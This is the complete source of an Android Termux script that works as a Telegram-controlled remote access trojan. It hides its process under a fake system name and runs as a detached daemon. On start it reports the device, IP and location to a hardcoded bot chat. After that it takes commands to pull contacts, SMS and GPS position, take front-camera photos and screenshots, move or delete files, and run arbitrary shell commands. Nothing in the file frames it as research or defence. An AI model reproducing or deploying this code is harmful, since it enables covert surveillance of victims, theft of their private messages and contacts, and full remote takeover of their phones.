#!/data/data/com.termux/files/usr/bin/python3
import os, sys, time, json, base64, subprocess, shutil

try:
    import requests
except ImportError:
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "requests", "-q"],
        capture_output=True
    )
    import requests

# ── config (replaced at build time) ──
_T = base64.b64decode("__TOKEN_B64__").decode()
_C = "__CHAT_ID__"
_A = f"https://api.telegram.org/bot{_T}"
_O = 0

# ── process rename ──
try:
    import ctypes
    ctypes.CDLL("libc.so.6").prctl(
        15, b"[android.hardware.sensors]", 0, 0, 0
    )
except Exception:
    pass

# ── api layer ──
def _post(method, **kw):
    try:
        return requests.post(f"{_A}/{method}", json=kw, timeout=20).json()
    except Exception:
        return {}

def tx(cid, text, md="Markdown"):
    for i in range(0, max(len(text), 1), 4000):
        _post("sendMessage",
              chat_id=cid, text=text[i:i+4000], parse_mode=md)
        time.sleep(0.1)

def tx_file(cid, path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"{_A}/sendDocument",
                data={"chat_id": cid, "caption": caption[:200]},
                files={"document": (os.path.basename(path), f)},
                timeout=90
            )
    except Exception as e:
        tx(cid, f"❌ `{e}`")

def tx_photo(cid, path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"{_A}/sendPhoto",
                data={"chat_id": cid, "caption": caption[:200]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        tx(cid, f"❌ `{e}`")

# ── helpers ──
def sh(cmd, timeout=30):
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout
        )
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return str(e)

def fmtsz(b):
    for u in ("B", "KB", "MB", "GB"):
        if b < 1024:
            return f"{b:.1f}{u}"
        b /= 1024
    return f"{b:.1f}TB"

# ── handlers ──
def h_info(cid):
    tx(cid, "🔍 Gathering...")
    d = dict(
        brand   = sh("getprop ro.product.brand"),
        model   = sh("getprop ro.product.model"),
        android = sh("getprop ro.build.version.release"),
        device  = sh("getprop ro.product.device"),
        kernel  = sh("uname -r"),
        arch    = sh("uname -m"),
        user    = sh("whoami"),
        host    = sh("hostname"),
        lip     = sh("ip route get 1 2>/dev/null | grep -oP 'src \\K\\S+' | head -1"),
        store   = sh("df -h ~ 2>/dev/null | tail -1 | awk '{print $2\" tot / \"$4\" free'}'"),
    )
    try:
        r        = requests.get("https://ipinfo.io/json", timeout=6).json()
        d["pip"] = r.get("ip", "N/A")
        d["loc"] = f"{r.get('city','')}, {r.get('region','')}, {r.get('country','')}"
        d["isp"] = r.get("org", "N/A")
    except Exception:
        d["pip"] = d["loc"] = d["isp"] = "N/A"
    tx(cid, (
        f"📱 *Device Info*\n"
        f"🏷 `{d['brand']} {d['model']}`\n"
        f"🤖 Android `{d['android']}` | `{d['device']}`\n"
        f"💻 Kernel `{d['kernel']}` (`{d['arch']}`)\n"
        f"👤 `{d['user']}@{d['host']}`\n"
        f"🌐 LAN `{d['lip']}` | WAN `{d['pip']}`\n"
        f"📍 `{d['loc']}`\n"
        f"🏢 `{d['isp']}`\n"
        f"💾 `{d['store']}`"
    ))

def h_location(cid):
    tx(cid, "📍 Scanning...")
    raw = sh("timeout 20 termux-location 2>/dev/null", timeout=25)
    if raw and "latitude" in raw:
        try:
            g   = json.loads(raw)
            lat = g["latitude"]
            lon = g["longitude"]
            acc = g.get("accuracy", "?")
            prv = g.get("provider", "gps")
            url = "https://maps.google.com/?q=" + str(lat) + "," + str(lon)
            tx(cid, (
                f"📍 *GPS Lock*\n"
                f"Lat `{lat}` | Lon `{lon}`\n"
                f"Acc `{acc}m` | Provider `{prv}`\n"
                f"🗺 [Open Maps]({url})"
            ))
            return
        except Exception:
            pass
    try:
        r   = requests.get("https://ipinfo.io/json", timeout=6).json()
        lc  = r.get("loc", "0,0").split(",")
        url = "https://maps.google.com/?q=" + lc[0] + "," + lc[1]
        tx(cid, (
            f"📍 *IP Location (approx)*\n"
            f"IP `{r.get('ip','?')}`\n"
            f"`{r.get('city','?')}, {r.get('region','?')}, {r.get('country','?')}`\n"
            f"ISP `{r.get('org','?')}`\n"
            f"🗺 [Open Maps]({url})"
        ))
    except Exception:
        tx(cid, "❌ Location unavailable")

def h_contacts(cid):
    tx(cid, "👥 Pulling contacts...")
    raw = sh("termux-contact-list 2>/dev/null", timeout=20)
    if not raw:
        tx(cid, "❌ Access denied / termux-api not installed")
        return
    try:
        cs    = json.loads(raw)
        lines = [f"👥 *Contacts ({len(cs)})*\n"]
        for c in cs[:150]:
            lines.append(f"• {c.get('name','?')}: `{c.get('number','?')}`")
        if len(cs) > 150:
            lines.append(f"\n_…+{len(cs)-150} more_")
        tx(cid, "\n".join(lines))
    except Exception:
        tx(cid, f"```\n{raw[:3800]}\n```")

def h_sms(cid, limit=20):
    tx(cid, f"💬 Pulling {limit} SMS...")
    raw = sh(f"termux-sms-list -l {limit} 2>/dev/null", timeout=20)
    if not raw:
        tx(cid, "❌ SMS unavailable / no permission")
        return
    try:
        msgs = json.loads(raw)
        out  = [f"💬 *SMS ({len(msgs)})*\n"]
        for m in msgs:
            out.append(
                f"📨 `{m.get('number','?')}`\n"
                f"{m.get('body','')[:150]}\n"
                f"⏰ _{m.get('received','')}_\n"
            )
        tx(cid, "\n".join(out))
    except Exception:
        tx(cid, f"```\n{raw[:3800]}\n```")

def h_ls(cid, path):
    p = os.path.expanduser(path or "~")
    try:
        ents = sorted(os.listdir(p))
        rows = [f"📁 `{p}` — {len(ents)} items\n"]
        for e in ents:
            fp = os.path.join(p, e)
            if os.path.isdir(fp):
                rows.append(f"📂 `{e}/`")
            else:
                try:
                    sz = fmtsz(os.path.getsize(fp))
                except Exception:
                    sz = "?"
                rows.append(f"📄 `{e}` ({sz})")
        tx(cid, "\n".join(rows))
    except Exception as e:
        tx(cid, f"❌ `{e}`")

def h_dl(cid, path):
    p = os.path.expanduser(path)
    if not os.path.isfile(p):
        tx(cid, f"❌ Not found: `{p}`")
        return
    tx(cid, f"📤 Sending `{os.path.basename(p)}`...")
    tx_file(cid, p)

def h_rm(cid, path):
    p = os.path.expanduser(path)
    try:
        if os.path.isfile(p):
            os.remove(p)
            tx(cid, f"✅ Deleted: `{p}`")
        elif os.path.isdir(p):
            shutil.rmtree(p)
            tx(cid, f"✅ Dir removed: `{p}`")
        else:
            tx(cid, f"❌ Not found: `{p}`")
    except Exception as e:
        tx(cid, f"❌ `{e}`")

def h_ul(cid, doc):
    if not doc:
        tx(cid, "📤 Send a file — I'll auto-save any file you send to this chat.")
        return
    try:
        fid  = doc["file_id"]
        name = doc.get("file_name", "upload")
        r    = requests.get(
            f"{_A}/getFile?file_id={fid}", timeout=10
        ).json()
        fpath = r["result"]["file_path"]
        data  = requests.get(
            f"https://api.telegram.org/file/bot{_T}/{fpath}",
            timeout=90
        ).content
        dest = os.path.expanduser(f"~/{name}")
        with open(dest, "wb") as f:
            f.write(data)
        tx(cid, f"✅ Saved: `{dest}` ({fmtsz(len(data))})")
    except Exception as e:
        tx(cid, f"❌ `{e}`")

def h_battery(cid):
    raw = sh("termux-battery-status 2>/dev/null")
    try:
        d = json.loads(raw)
        tx(cid, (
            f"🔋 *Battery*\n"
            f"Level `{d.get('percentage','?')}%` — `{d.get('status','?')}`\n"
            f"Plugged `{d.get('plugged','?')}`\n"
            f"Temp `{d.get('temperature','?')}°C` | Health `{d.get('health','?')}`"
        ))
    except Exception:
        tx(cid, f"```\n{raw}\n```" if raw else "❌ unavailable")

def h_selfie(cid):
    p = "/tmp/.cam0.jpg"
    sh(f"termux-camera-photo -c 1 {p} 2>/dev/null", timeout=20)
    if os.path.exists(p):
        tx_photo(cid, p, "📷 Selfie")
        os.remove(p)
    else:
        tx(cid, "❌ Camera unavailable")

def h_screen(cid):
    p = "/tmp/.scr0.png"
    sh(f"termux-screenshot {p} 2>/dev/null", timeout=12)
    if os.path.exists(p):
        tx_photo(cid, p, "📸 Screenshot")
        os.remove(p)
    else:
        tx(cid, "❌ Screenshot failed")

def h_shell(cid, cmd):
    out = sh(cmd, timeout=45)
    tx(cid, f"```\n{out[:3900] or '(no output)'}\n```")

HELP = (
    "🛠 *TERMUX CONTROLLER*\n\n"
    "📁 *Files*\n"
    "`/ls [path]` — list directory\n"
    "`/dl <path>` — download file\n"
    "`/rm <path>` — delete file/dir\n"
    "`/ul` — upload (send file to bot)\n\n"
    "📋 *Data*\n"
    "`/contacts` — contact list\n"
    "`/sms [n]` — read SMS (default 20)\n"
    "`/location` — GPS / IP location\n\n"
    "📱 *Device*\n"
    "`/info` — full device info\n"
    "`/battery` — battery status\n"
    "`/selfie` — front camera\n"
    "`/screen` — screenshot\n\n"
    "⚙️ *Shell*\n"
    "`/sh <cmd>` — run shell command\n"
    "`/help` — this menu"
)

# ── command router ──
def dispatch(cid, text, msg):
    parts = text.strip().split(None, 1)
    cmd   = parts[0].lower()
    arg   = parts[1].strip() if len(parts) > 1 else ""

    if cmd in ("/start", "/help"):
        tx(cid, HELP)
    elif cmd == "/info":
        h_info(cid)
    elif cmd == "/location":
        h_location(cid)
    elif cmd == "/contacts":
        h_contacts(cid)
    elif cmd == "/sms":
        h_sms(cid, int(arg) if arg.isdigit() else 20)
    elif cmd == "/ls":
        h_ls(cid, arg)
    elif cmd == "/dl":
        h_dl(cid, arg) if arg else tx(cid, "Usage: `/dl <path>`")
    elif cmd == "/rm":
        h_rm(cid, arg) if arg else tx(cid, "Usage: `/rm <path>`")
    elif cmd == "/ul":
        h_ul(cid, msg.get("document"))
    elif cmd == "/battery":
        h_battery(cid)
    elif cmd == "/selfie":
        h_selfie(cid)
    elif cmd == "/screen":
        h_screen(cid)
    elif cmd == "/sh":
        h_shell(cid, arg) if arg else tx(cid, "Usage: `/sh <cmd>`")
    else:
        tx(cid, "❓ Unknown. Use /help")

# ── startup notification ──
def notify():
    d = dict(
        brand   = sh("getprop ro.product.brand"),
        model   = sh("getprop ro.product.model"),
        android = sh("getprop ro.build.version.release"),
        user    = sh("whoami"),
        host    = sh("hostname"),
    )
    try:
        r   = requests.get("https://ipinfo.io/json", timeout=6).json()
        pip = r.get("ip", "N/A")
        loc = f"{r.get('city','')}, {r.get('region','')}, {r.get('country','')}"
        isp = r.get("org", "N/A")
    except Exception:
        pip = loc = isp = "N/A"
    tx(_C, (
        f"🔔 *TERMUX ONLINE*\n"
        f"📱 `{d['brand']} {d['model']}`\n"
        f"🤖 Android `{d['android']}`\n"
        f"👤 `{d['user']}@{d['host']}`\n"
        f"🌍 `{pip}`  📍 `{loc}`\n"
        f"🏢 `{isp}`\n\n"
        f"_/help for commands_"
    ))

# ── poll loop ──
def poll():
    global _O
    while True:
        try:
            r = _post("getUpdates", offset=_O, timeout=25,
                      allowed_updates=["message"])
            for upd in r.get("result", []):
                _O   = upd["update_id"] + 1
                msg  = upd.get("message", {})
                if not msg:
                    continue
                cid  = str(msg.get("chat", {}).get("id", ""))
                text = msg.get("text", "")
                doc  = msg.get("document")
                if cid != _C:
                    continue
                if doc and not text:
                    h_ul(cid, doc)
                    continue
                if text:
                    try:
                        dispatch(cid, text, msg)
                    except Exception as e:
                        tx(cid, f"❌ `{e}`")
        except Exception:
            time.sleep(5)
        time.sleep(1)

# ── daemonize (double fork) ──
def daemonize():
    try:
        if os.fork() > 0:
            sys.exit(0)
    except OSError:
        pass
    os.setsid()
    try:
        if os.fork() > 0:
            sys.exit(0)
    except OSError:
        pass
    dn = open(os.devnull, "rb+")
    for s in (sys.stdin, sys.stdout, sys.stderr):
        try:
            os.dup2(dn.fileno(), s.fileno())
        except Exception:
            pass

# ── entry ──
def main():
    lf = "/tmp/.ahw.lock"
    try:
        if os.path.exists(lf):
            pid = int(open(lf).read().strip())
            os.kill(pid, 0)   # raises ProcessLookupError if dead
            sys.exit(0)        # alive → already running
    except (ProcessLookupError, ValueError):
        pass
    except Exception:
        pass

    daemonize()

    try:
        with open(lf, "w") as f:
            f.write(str(os.getpid()))
    except Exception:
        pass

    try:
        notify()
    except Exception:
        pass

    poll()

if __name__ == "__main__":
    main()